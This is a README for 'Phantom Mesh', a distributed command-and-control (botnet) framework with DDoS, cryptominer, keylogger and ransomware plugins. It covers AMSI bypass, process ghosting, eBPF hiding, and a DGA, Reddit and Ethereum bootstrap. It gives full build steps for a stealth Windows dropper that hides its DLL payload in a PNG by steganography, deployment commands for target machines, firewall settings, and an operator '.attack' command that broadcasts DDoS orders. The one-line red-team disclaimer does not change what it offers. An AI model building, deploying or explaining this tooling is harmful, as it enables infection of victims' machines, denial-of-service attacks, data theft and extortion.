# Phantom Mesh

> A distributed, resilient command-and-control framework with multi-platform support.

---

## Table of Contents

- [Overview](#overview)
- [Architecture](#architecture)
- [Features](#features)
- [Quick Start](#quick-start)
- [Operational Guide](#operational-guide)
- [Network Configuration](#network-configuration)
- [Project Structure](#project-structure)

---

## Overview

Phantom Mesh is a **two-tier distributed C2 framework** designed for resilience and stealth:

| Layer | Component | Purpose |
|-------|-----------|---------|
| **Control Plane** | Cloud Nodes (Zig) + Phantom (Rust) | P2P mesh, command signing, verification |
| **Execution Plane** | Edge Nodes (Rust) | Target agents, LAN clustering, task execution |

The **Phantom** node is the hidden master—indistinguishable from Cloud nodes in network traffic, but holds the private signing key.

---

## Architecture

![Network Architecture](docs/architecture.png)

```
                    ┌─────────────────────────────────────┐
                    │          CONTROL PLANE              │
                    │      Cloud P2P Mesh (UDP 31337)     │
                    │                                     │
                    │   Cloud ◄──► Cloud ◄──► PHANTOM     │
                    │                           │         │
                    │                      SSH (12961)    │
                    │                           ▼         │
                    │                      [Operator]     │
                    └───────────────┬─────────────────────┘
                                    │ MQTT (1883)
                    ┌───────────────▼─────────────────────┐
                    │         EXECUTION PLANE             │
                    │       LAN Cluster (Edge Nodes)      │
                    │                                     │
                    │   Worker ◄──► LEADER ◄──► Worker    │
                    │              (TCP 31339)            │
                    └─────────────────────────────────────┘
```

See [docs/architecture.md](docs/architecture.md) for detailed technical design.

---

## Features

| Category | Features |
|----------|----------|
| **Network** | P2P gossip mesh, LAN clustering, multi-cloud failover |
| **Security** | Ed25519 signed commands, rotating magic numbers, signature-only master |
| **Bootstrap** | 5-tier fallback: Cache → DNS-over-HTTPS → Reddit → DGA → Ethereum |
| **Stealth** | eBPF hiding (Linux), process ghosting (Windows), fileless execution |
| **Plugins** | DDoS, cryptominer, keylogger, ransomware (modular) |

---

## Quick Start

### Prerequisites

- **Rust** 1.70+ (Phantom C2, Edge Agent)
- **Zig** 0.11+ (Cloud Nodes)
- **MinGW-w64** (If cross-compiling for Windows on Linux/Mac)

### 1. Build Cloud & C2 (infrastructure)

```bash
# Build Cloud Node (Zig)
make cloud_linux_x64

# Build Phantom C2 (Rust)
cargo build -p phantom --release
```

### 2. Build Stealth Agent (Windows Target)

The Windows agent requires a multi-stage build to embed the payload via steganography.

```bash
# 1. compile Core Logic as DLL (Payload)
cargo build -p edge --lib --release --target x86_64-pc-windows-gnu

# 2. Embed DLL into PNG (Steganography)
# This encrypts target/.../edge.dll and injects it into src/assets/logo.png
./target/debug/steg_maker_build target/x86_64-pc-windows-gnu/release/edge.dll crates/nodes/edge/src/assets/logo.png

# 3. Compile Dropper EXE (contains the PNG)
# Only now do we build the final executable
cargo build -p edge --bin edge --release --target x86_64-pc-windows-gnu --no-default-features

# Resulting Artifact:
# dist/edge.exe (Stealth Dropper, ~2.6MB)
```

**Debug Build**: To enable console logs and IPC, add `--features debug_mode` to the final command.

### 3. Deploy

1. **Cloud**: Run `./dist/cloud_linux_x64 --port 31337` on VPS.
2. **C2**: Run `./target/release/phantom --key keys/ --port 12961`.
3. **Agent**: Execute `edge.exe` on target Windows machine.

---

## Operational Guide

### Verifying Stealth (Debug Mode)

To verify the agent is working without exposing it to EDR:
1. Build with `--features debug_mode`.
2. Run `dist/edge_debug.exe`.
3. Observe logs for:
    - `[GhostProtocol] ... Complete`: AMSI Bypass success.
    - `[Persistence] ... Triad`: Persistence installed.
    - `[C2] ... Tag: ...`: Network connectivity.

### C2 Shell Commands

| Command | Description | Example |
|---------|-------------|---------|
| `help` | List all commands | `help` |
| `.peers` | Show direct P2P mesh neighbors | `.peers` |
| `.count` | Estimate total network size | `.count` |
| `.attack <ip> <port> <duration>` | Broadcast DDoS command | `.attack 1.2.3.4 80 60` |

---

## Network Configuration

### Firewall Rules

| Direction | Port | Protocol | Purpose |
|-----------|------|----------|---------|
| **Inbound** | 31337 | UDP | Cloud P2P Mesh |
| **Inbound** | 12961 | TCP | Phantom Operator SSH |
| **Inbound** | 1883 | TCP | Cloud MQTT (Edge Listener) |
| **Outbound** | 80/443 | TCP | Edge C2 (DoH, Reddit, Fallback) |

---

## Project Structure

```
phantom-mesh/
├── crates/
│   ├── nodes/
│   │   ├── cloud/          # Cloud Relay (Zig)
│   │   ├── phantom/        # C2 Master (Rust)
│   │   └── edge/           # Stealth Agent (Rust)
│   │       ├── src/stealth/    # Evasion Engine (Windows/Linux)
│   │       ├── src/c2/         # Comm Logic
│   │       └── src/assets/     # Steganography Assets
│   └── shared/             # Cryptography & Protocol
├── tools/
│   └── steg_maker/         # Payload Packer (PNG Injector)
├── docs/                   # Architecture Documentation
└── dist/                   # Final Build Artifacts
```

---

## Disclaimer

**Authorized Research Only**. This software contains advanced evasion techniques (Process Ghosting, AMSI Bypass) designed for red team simulation. Misuse is illegal.
